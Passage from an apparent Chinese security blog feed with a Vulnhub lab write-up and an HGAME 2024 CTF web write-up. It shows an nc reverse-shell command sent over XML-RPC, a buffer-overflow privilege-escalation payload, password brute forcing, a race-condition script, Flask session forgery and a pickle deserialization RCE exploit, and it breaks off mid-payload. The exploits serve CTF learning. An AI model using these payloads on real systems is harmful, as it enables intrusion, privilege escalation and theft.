class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xmlrpc.client</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> xmlrpc.client.ServerProxy(<span class="string">&quot;http://192.168.50.43:8000/&quot;</span>) <span class="keyword">as</span> proxy:</span><br><span class="line">    cmd = <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.50.216 6666 &gt;/tmp/f&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(proxy.secure_cmd(cmd,<span class="number">9935</span>)))</span><br></pre></td></tr></table></figure><h2 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h2><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222200951904.png" alt="image-20240222200951904"></p><p>add_record是个32位Linux可执行程序且具有特殊权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">peda  python  动态调试</span><br></pre></td></tr></table></figure><p>首先执行 查看是否含有提交数据入口点</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222202050996.png" alt="image-20240222202050996"></p><p>发现含有几个位置用户可以提交数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./add_record   # 静态调试程序</span><br><span class="line">gdb -q  #程序静态执行</span><br><span class="line">r #执行</span><br><span class="line">q#退出</span><br></pre></td></tr></table></figure><p>查找存在内存溢出的变量位置（输入大量数据）</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222202702534.png" alt="image-20240222202702534"></p><p>程序正常退出，说明不存在</p><p>在最后一个变量 描述中存在溢出</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222203152047.png" alt="image-20240222203152047"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">重点关注：EIP: 0x41414141 (&#x27;AAAA&#x27;)</span><br><span class="line">确定(&#x27;AAAA&#x27;)属于哪个位置</span><br><span class="line">一开始判断 选择使用500个去写入  判断出溢出点后 </span><br><span class="line">可以先减少字符后 再进行寻找溢出位置 后面减少到100 仍可以 判断出溢出</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">使用 pattern 生成特殊字符</span><br><span class="line">pattern create 100</span><br><span class="line">pattern search   #识别位置</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204057490.png" alt="image-20240222204057490"></p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204159710.png" alt="image-20240222204159710"></p><p>使用 <code>pattern search</code> 即可帮助我们识别出来</p><p>验证</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204424234.png" alt="image-20240222204424234"></p><p>填入数据验证得</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204455545.png" alt="image-20240222204455545"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">前62位占位  BCDE 成功溢出</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">disas main   #显示程序 汇编代码</span><br><span class="line">程序执行 CPU分配下发地址</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222204832573.png" alt="image-20240222204832573"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">call 调用系统函数 打开文本文件命令</span><br><span class="line">通过之前找用户提交数据位置点的时候 程序会生成一个txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222211542280.png" alt="image-20240222211542280"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">break *地址   #下断点</span><br><span class="line">s#单步执行</span><br><span class="line">c#继续执行</span><br><span class="line">del number#删断点</span><br><span class="line">info func     #查看函数信息</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222211442585.png" alt="image-20240222211442585"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disas 方法名#查看具体函数所执行的汇编指令</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222211945780.png" alt="image-20240222211945780"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;strcpy@plt&gt; 存在缓冲区溢出漏洞</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222212132389.png" alt="image-20240222212132389"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;setuid@plt&gt;</span><br><span class="line">&lt;system@plt&gt;</span><br></pre></td></tr></table></figure><p>注：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">程序执行：</span><br><span class="line">打开文本文件</span><br><span class="line">用户提交用户名</span><br><span class="line">用户提交工作年限</span><br><span class="line">用户提交薪资</span><br><span class="line">用户提交是否遇到麻烦 遇到过为1 没有为0</span><br><span class="line">用户描述遇到的问题</span><br><span class="line">（工作年限和工资都为int类型）（溢出存在于用户描述问题这个变量0）</span><br><span class="line">一定要选遇到过 输入1   输入0则直接退出程序</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222212627878.png" alt="image-20240222212627878"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据是倒过来存储</span><br><span class="line">CPU架构  大头小头概念</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import struct;print(&#x27;aa\n1\n1\n1\n&#x27; +&#x27;A&#x27;* 62 + struct.pack(&#x27;I&#x27;,0x08048676))&quot; &gt; payload</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222214209987.png" alt="image-20240222214209987"></p><p>将 payload 输入进程序 查看</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222215257158.png" alt="image-20240222215257158"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">发现 程序 新建了两个进程 /bin/bash</span><br><span class="line">跟进一下 查看程序发生了什么</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222220409213.png" alt="image-20240222220409213"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat payload - | ./add_record</span><br><span class="line">查看payload 将payload 全部输入给 add_record 这个程序即可提权</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240222220950638-1708611399263-40.png" alt="image-20240222220950638"></p><hr><h3 id="gdb命令总结"><a href="#gdb命令总结" class="headerlink" title="gdb命令总结"></a>gdb命令总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb -q ./程序名  #静态调试程序</span><br><span class="line">gdb -q  #程序静态执行</span><br><span class="line">r #执行</span><br><span class="line">q#退出</span><br><span class="line"></span><br><span class="line">pattern create 100#生成100位特殊字符</span><br><span class="line">pattern search#定位字符</span><br><span class="line"></span><br><span class="line">break *地址   #下断点</span><br><span class="line">s#单步执行</span><br><span class="line">c#继续执行</span><br><span class="line">del number#删断点</span><br><span class="line">info func     #查看函数信息</span><br><span class="line">disas main  #显示程序全部汇编代码</span><br><span class="line">disas 方法名  #查看具体函数所执行的汇编指令</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HGAME 2024 WEEK 2 wp</title>
      <link href="/2024/02/18/HGAME-2024-WEEK-2-Web-wp/"/>
      <url>/2024/02/18/HGAME-2024-WEEK-2-Web-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Web-部分"><a href="#Web-部分" class="headerlink" title="Web(部分)"></a>Web(部分)</h1><blockquote><p>前言</p><p>HGAME week2 直接上难度了,暂时只掌握了三道</p><p>还有两道分别是java的堆叠注入 以及 go的SSTI+XSS</p></blockquote><h2 id="What-the-cow-say"><a href="#What-the-cow-say" class="headerlink" title="What the cow say?"></a>What the cow say?</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">描述：the cow want to tell you something</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过描述 以及查看题目 以为是xss或者sql又或者SSTI的东西  </span><br><span class="line">fuzz后发现居然是RCE 也是绝的</span><br></pre></td></tr></table></figure><p>反引号RCE　且存在waf  需要进行绕过</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217114418451.png" alt="image-20240217114418451"></p><p>在根目录下存在 flag_is_here<br>尝试cat读取时发现有waf<br>cat 和 flag 都被过滤了  且flag_is_here 是一个文件目录<br>目录下存在flag_c0w54y</p><blockquote><p>cat 可以使用 转义符绕过 或者更换其他命令查看<br>flag可以使用单双引号隔开或占位符从而达到不被waf匹配的效果</p></blockquote><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217114903310.png" alt="image-20240217114903310"></p><h2 id="Select-More-Courses"><a href="#Select-More-Courses" class="headerlink" title="Select More Courses"></a>Select More Courses</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">描述：</span><br><span class="line">ma5hr00m wants to take more courses, but he may be racing against time. Can you help him? （数据库初始化需要时间，请稍作等待）</span><br><span class="line"></span><br><span class="line">提示1</span><br><span class="line">可参考的弱密码字典：https://github.com/TheKingOfDuck/fuzzDicts/blob/master/passwordDict/top1000.txt</span><br></pre></td></tr></table></figure><p>通过描述 我们可知道 用户名 ma5hr00m<br>同时给了我们密码字典</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217202606289.png" alt="image-20240217202606289"></p><p>使用bp intruder模块 加载字典</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217205148810.png" alt="image-20240217205148810"></p><p>根据返回包的状态码以及返回长度  很显然<br>password 是 qwert123</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217203028409.png" alt="image-20240217203028409"></p><p>一开始 去自主选课 还以为和 Week1 Select Courses 类似<br>由于只有一门课程 尝试bp intruder模块 直接发包  发现 并没选择上课程</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217205030580.png" alt="image-20240217205030580"></p><p>看来还得从 选课扩学分申请 做文章</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217205243566.png" alt="image-20240217205243566"></p><p>好吧 还给了 提示 Race against time!</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217210337649.png" alt="image-20240217210337649"></p><p>这个我是真的想笑 我懵了 一直跑 扩学分申请  一直没提示 一直跑<br>后面去看一下 选课系统 绷不住 </p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240217210537820.png" alt="image-20240217210537820"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">跑了3827分 直接选 然后点选完了即可获取flag</span><br></pre></td></tr></table></figure><p>同时看官方wp  附上官方的解释及python脚本</p><p>登⼊系统后进⼊ &#x2F;expand 路由，根据提⽰ race against time ，并发POST请求 &#x2F;api&#x2F;expand 接⼝，利⽤此处存在的条件竞争漏洞，可实现拓展学分上限，然后选择对应课程获取flag。</p><p>利⽤条件竞争可使⽤BurpSuite⾃带的Intruder模块，也可以⾃⾏编写脚本实现，以下为⼀个可供参考的利⽤此处漏洞的python脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_request</span>():</span><br><span class="line">    url = <span class="string">&quot;http://139.196.183.57:32368/api/expand&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;139.196.183.57:32368&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://139.196.183.57:32368&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://139.196.183.57:32368/expand&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh; q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;session=MTcwNzEwNzQzM3xEWDhFQVFMX2dBQUJFQUVRQUFBcV80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQW9BQ0cxaE5XaHlNREJ0fHOdF2Z4AqqV3oV6z2EPpM2zyz1UOPBTtu69oB8qnaWM&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    payload = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;ma5hr00m&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url, headers=headers, json=payload)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Response: <span class="subst">&#123;response.status_code&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建50个线程并发发送请求</span></span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    thread = threading.Thread(target=send_request)</span><br><span class="line">    thread.start()</span><br><span class="line">    threads.append(thread)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等待所有线程完成</span></span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">    thread.join()</span><br></pre></td></tr></table></figure><h2 id="myflask"><a href="#myflask" class="headerlink" title="myflask"></a>myflask</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">描述：善用搜索引擎，容器中的 Python 版本为 3.11</span><br></pre></td></tr></table></figure><p>访问题目环境得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, send_file</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> pytz <span class="keyword">import</span> timezone</span><br><span class="line"></span><br><span class="line">currentDateAndTime = datetime.now(timezone(<span class="string">&#x27;Asia/Shanghai&#x27;</span>))</span><br><span class="line">currentTime = currentDateAndTime.strftime(<span class="string">&quot;%H%M%S&quot;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># Tips: Try to crack this first ↓</span></span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = currentTime</span><br><span class="line"><span class="built_in">print</span>(currentTime)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;guest&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;app.py&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;There is no session available in your client :(&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You are &#123;&#125; now&#x27;</span>.<span class="built_in">format</span>(session[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># For POST requests from admin</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        pickle_data=base64.b64decode(request.form.get(<span class="string">&#x27;pickle_data&#x27;</span>))</span><br><span class="line">        <span class="comment"># Tips: Here try to trigger RCE</span></span><br><span class="line">        userdata=pickle.loads(pickle_data)</span><br><span class="line">        <span class="keyword">return</span> userdata</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access Denied&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><blockquote><p>考察知识点<br>flask session 伪造<br>pickle 反序列化 RCE</p></blockquote><h3 id="flask-session-伪造"><a href="#flask-session-伪造" class="headerlink" title="flask session 伪造"></a>flask session 伪造</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">由currentTime = currentDateAndTime.strftime(&quot;%H%M%S&quot;)</span><br><span class="line">得flask的SECRET_KEY是根据脚本执行(靶机创建)时的时间生成格式为时分秒</span><br></pre></td></tr></table></figure><p>根据获取 cookie 的 session</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZdDX2A.UfKBo635rJcG50tQLzAJ6bhcqko</span><br></pre></td></tr></table></figure><p>使用<a href="https://github.com/Paradoxis/Flask-Unsign">flask_unsign</a>配合纯6位数字字典进行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign  --unsign --cookie &quot;eyJ1c2VybmFtZSI6Imd1ZXN0In0.ZdDX2A.UfKBo635rJcG50tQLzAJ6bhcqko&quot; --no-literal-eval --wordlist 6-digits-000000-999999.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218000454860.png" alt="image-20240218000454860"></p><p>使用[flask-session-cookie-manager](<a href="https://github.com/noraj/flask-session-cookie-manager">noraj&#x2F;flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder&#x2F;Encoder (github.com)</a>)验证密钥且伪造cookie </p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218000954784.png" alt="image-20240218000954784"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ1c2VybmFtZSI6ImFkbWluIn0.ZdDaMw.IKzG8y5QCWSap0WOQxQxSasO6s4</span><br></pre></td></tr></table></figure><p>更换cookie 访问 &#x2F;flag 可得</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218001546912.png" alt="image-20240218001546912"></p><h3 id="pickle-反序列化-RCE"><a href="#pickle-反序列化-RCE" class="headerlink" title="pickle 反序列化 RCE"></a>pickle 反序列化 RCE</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">根据   pickle_data=base64.b64decode(request.form.get(<span class="string">&#x27;pickle_data&#x27;</span>))</span><br><span class="line">        <span class="comment"># Tips: Here try to trigger RCE</span></span><br><span class="line">        userdata=pickle.loads(pickle_data)</span><br><span class="line">        <span class="keyword">return</span> userdata</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access Denied&#x27;</span></span><br></pre></td></tr></table></figure><p>同时也给我们提示这里尝试触发RCE<br>由此得出exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">from urllib.parse import urlencode</span><br><span class="line"></span><br><span class="line">class pickleRce:</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (open,(&#x27;/flag&#x27;,&#x27;r&#x27;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = base64.b64encode(pickle.dumps(pickleRce()))</span><br><span class="line">post_parms = &#123;&#x27;pickle_data&#x27;:payload&#125;</span><br><span class="line">print(urlencode(post_parms))</span><br><span class="line"># pickle_data=gASVHwAAAAAAAACMAmlvlIwEb3BlbpSTlIwFL2ZsYWeUjAFylIaUUpQu</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218003222282.png" alt="image-20240218003222282"></p><blockquote><p>官方wp学习</p></blockquote><p>系统级 getshell (带回显)</p><p>Flask 项目 debug 模式打开后⽀持自动重载</p><p>使用pickle 反序列化 RCE读取 &#x2F;proc&#x2F;self&#x2F;cmdline ，确定服务器上 flask 脚本名称为app.py</p><p><img src="https://raw.githubusercontent.com/liangmosec/images/master/imgs/image-20240218003717486.png" alt="image-20240218003717486"></p><p>编写带命令执行功能的 flask 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, send_file</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/cmd&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mycmd</span>():</span><br><span class="line">    handle = os.popen(request.form.get(<span class="string">&#x27;cmd&#x27;</span>))</span><br><span class="line">    ret = handle.read()</span><br><span class="line">    handle.close()</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure><p>将以上脚本 base64 编码，并生成写入文件的 payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myflaskrce</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 这里返回一个元组，包含eval函数和一个经过base64编码的命令字符串</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;echo 